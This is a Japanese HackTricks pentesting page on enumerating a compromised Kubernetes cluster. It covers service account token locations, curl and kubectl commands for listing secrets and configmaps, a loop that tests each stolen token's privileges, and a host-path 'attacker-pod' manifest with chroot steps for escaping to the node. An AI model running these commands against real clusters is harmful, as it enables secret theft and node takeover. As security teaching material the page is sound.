# Kubernetes列挙

{% hint style="success" %}
AWSハッキングの学習と練習:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と練習: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
{% endhint %}

## Kubernetesトークン

マシンへのアクセスが侵害されている場合、ユーザーはいくつかのKubernetesプラットフォームにアクセスできる可能性があります。トークンは通常、**環境変数`KUBECONFIG`**が指すファイルまたは**`~/.kube`**内にあります。

このフォルダーには、**APIサーバーに接続するためのトークンと構成**が含まれる構成ファイルが含まれています。このフォルダーには以前に取得した情報が含まれるキャッシュフォルダーもあります。

Kubernetes環境内のPodが侵害されている場合、現在のK8環境に関するトークンや情報を見つけることができる他の場所があります。

### サービスアカウントトークン

続行する前に、Kubernetesのサービスが何かを知らない場合は、**このリンクに従ってKubernetesアーキテクチャに関する情報を少なくとも読んでください。**

Kubernetesの[ドキュメント](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)から：

_「Podを作成するとき、サービスアカウントを指定しない場合、同じ名前空間の_デフォルト_サービスアカウントが自動的に割り当てられます。」_

**ServiceAccount**はKubernetesによって管理され、ポッドで実行されるプロセスにアイデンティティを提供するために使用されます。\
すべてのサービスアカウントにはそれに関連するシークレットがあり、このシークレットにはベアラートークンが含まれています。これはJSON Web Token（JWT）であり、2つの当事者間で安全にクレームを表現するための方法です。

通常、次のディレクトリの**いずれか**：

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

には次のファイルが含まれています：

* **ca.crt**：Kubernetes通信を確認するためのCA証明書です
* **namespace**：現在の名前空間を示します
* **token**：現在のポッドの**サービストークン**が含まれています。

トークンを取得したら、APIサーバーは環境変数**`KUBECONFIG`**内に見つけることができます。詳細については、`(env | set) | grep -i "kuber|kube`**`"`**を実行してください。

サービスアカウントトークンは、**sa.key**ファイルによって署名され、**sa.pub**によって検証されます。

**Kubernetes**のデフォルトの場所：

* /etc/kubernetes/pki

**Minikube**のデフォルトの場所：

* /var/lib/localkube/certs

### ホットポッド

_**ホットポッド**_は特権付きサービスアカウントトークンを含むポッドです。特権付きサービスアカウントトークンは、シークレットのリスト表示、ポッドの作成などの特権付きタスクを実行する権限を持つトークンです。

## RBAC

**RBAC**が何かわからない場合は、**このセクション**を読んでください。

## 列挙チートシート

K8s環境を列挙するには、次のものが必要です：

* **有効な認証トークン**。前のセクションでユーザートークンとサービスアカウントトークンを検索する場所を見ました。
* Kubernetes APIの**アドレス（_**https://host:port**_**）**。これは通常、環境変数やkube構成ファイルに見つかります。
* **オプション**: **APIサーバーを検証するためのca.crt**。トークンが見つかる場所と同じ場所にあります。これはAPIサーバー証明書を検証するために役立ちますが、`kubectl`で`--insecure-skip-tls-verify`を使用するか、`curl`で`-k`を使用すると、これは必要ありません。

これらの詳細があれば、Kubernetesを**列挙**できます。何らかの理由で**API**が**インターネット**経由で**アクセス可能**な場合、その情報をダウンロードしてホストからプラットフォームを列挙できます。

ただし、通常は**APIサーバーは内部ネットワークに存在**するため、侵害されたマシンを介してトンネルを作成してマシンからアクセスするか、[**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)バイナリをアップロードするか、`curl/wget/anything`を使用してAPIサーバーに対して生のHTTPリクエストを実行する必要があります。

### `list`と`get`動詞の違い

**`get`**権限を持つと、特定のアセットの情報にアクセスできます（`kubectl`の`describe`オプション）。
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
もし**`list`**権限を持っている場合、特定の種類のアセットをリストするためのAPIリクエストを実行することが許可されます（_`kubectl`_の`get`オプション）。
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
もし**`watch`**権限を持っている場合、アセットを監視するためのAPIリクエストを実行することが許可されます:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
彼らは、Deploymentの完全なマニフェストを返すストリーミング接続を開きます（変更されるたびに、または新しいものが作成されたとき）。

{% hint style="danger" %}
次の`kubectl`コマンドは、オブジェクトをリストする方法を示しています。データにアクセスしたい場合は、`get`の代わりに`describe`を使用する必要があります。
{% endhint %}

### curlを使用

ポッド内から、いくつかの環境変数を使用できます：
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
デフォルトでは、ポッドはドメイン名`kubernetes.default.svc`で**kube-apiサーバーにアクセス**でき、`/etc/resolv.config`でkubeネットワークを確認できます（同じ範囲の".1"がkube-apiエンドポイントです）。

### kubectlの使用

トークンとAPIサーバーのアドレスを持っている場合、以下に示すようにkubectlまたはcurlを使用してアクセスできます：

デフォルトでは、APISERVERは`https://`スキーマで通信しています
{% endhint %}
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> もしurlに`https://`がない場合、Bad Requestのようなエラーが発生する可能性があります。

公式のkubectlチートシートは[こちら](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)で見つけることができます。以下のセクションの目標は、取得した新しいK8sを列挙し理解するための異なるオプションを整理された方法で提示することです。

`kubectl`が送信するHTTPリクエストを見つけるには、パラメータ`-v=8`を使用できます。

#### MitM kubectl - kubectlのプロキシ化
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### 現在の構成

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

ユーザーの資格情報を盗むことができた場合、次のような方法で**ローカルに設定**することができます:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### サポートされているリソースの取得

この情報を使用すると、リストできるすべてのサービスがわかります

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### 現在の権限を取得する

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

特権をチェックする別の方法は、次のツールを使用することです: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

**Kubernetes RBAC**について詳しく学ぶことができます:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**どの特権を持っているか**を知ったら、次のページをチェックして、**それらを悪用して特権を昇格させることができるか**を確認してください:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### 他のロールを取得
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
### ネームスペースの取得

Kubernetesは、同じ物理クラスターをバックエンドとする複数の仮想クラスターをサポートしています。これらの仮想クラスターは**ネームスペース**と呼ばれます。
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### シークレットの取得

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

シークレットを読むことができる場合、次の行を使用して、各トークンに関連する特権を取得できます:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### サービスアカウントの取得

このページの冒頭で議論されたように、**ポッドが実行されるときに通常サービスアカウントが割り当てられます**。したがって、サービスアカウント、その権限、および実行されている場所をリストアップすることで、ユーザーが特権を昇格させることができるかもしれません。

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### デプロイメントの取得

デプロイメントは、実行する必要がある**コンポーネント**を指定します。
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### ポッドの取得

ポッドは実際に実行されるコンテナです。
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
### サービスの取得

Kubernetesの**サービス**は、**特定のポートとIPでサービスを公開するために使用**されます（実際にサービスを提供しているポッドに対してロードバランサーとして機能します）。これは、攻撃を試みる他のサービスを見つけることができる場所を知るために興味深いです。
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### ノードの取得

クラスタ内に構成されたすべての**ノード**を取得します。
```
k get nodes
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### デーモンセットの取得

**デーモンセット**は、クラスターのすべてのノード（または選択されたノード）で**特定のポッドが実行されていることを確認**することができます。デーモンセットを削除すると、それによって管理されているポッドも削除されます。
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### cronjobの取得

Cronジョブを使用すると、crontabのような構文を使用して、特定のアクションを実行するポッドの起動をスケジュールすることができます。
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### configMapの取得

configMapには常に多くの情報とconfigfileが含まれており、kubernetesで実行されるアプリケーションに提供されます。通常、他の内部/外部サービスに接続して検証するために使用される多くのパスワード、シークレット、トークンが見つかります。
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### "all"を取得する

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **ポッドの消費量を取得する**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### ポッドからの脱出

新しいポッドを作成できる場合、それらからノードに脱出することができるかもしれません。そのためには、yamlファイルを使用して新しいポッドを作成し、作成したポッドに切り替えてから、ノードのシステムにchrootする必要があります。既存のポッドをyamlファイルの参照として使用できます。なぜなら、それらは既存のイメージとパスを表示しているからです。
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> 特定のノードにポッドを作成する必要がある場合は、次のコマンドを使用してノードのラベルを取得できます
>
> `k get nodes --show-labels`
>
> 一般的に、kubernetes.io/hostname と node-role.kubernetes.io/master は選択するのに適したラベルです。
>
> [reference]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

その後、attack.yaml ファイルを作成します
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[元のyamlソース](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

その後、ポッドを作成します。
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
今後、作成したポッドに切り替えることができます。
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
そして最後に、ノードのシステムにchrootします。
```bash
chroot /root /bin/bash
```
情報取得元：[Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## 参考文献

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
AWSハッキングの学習と実践：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングの学習と実践：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
{% endhint %}
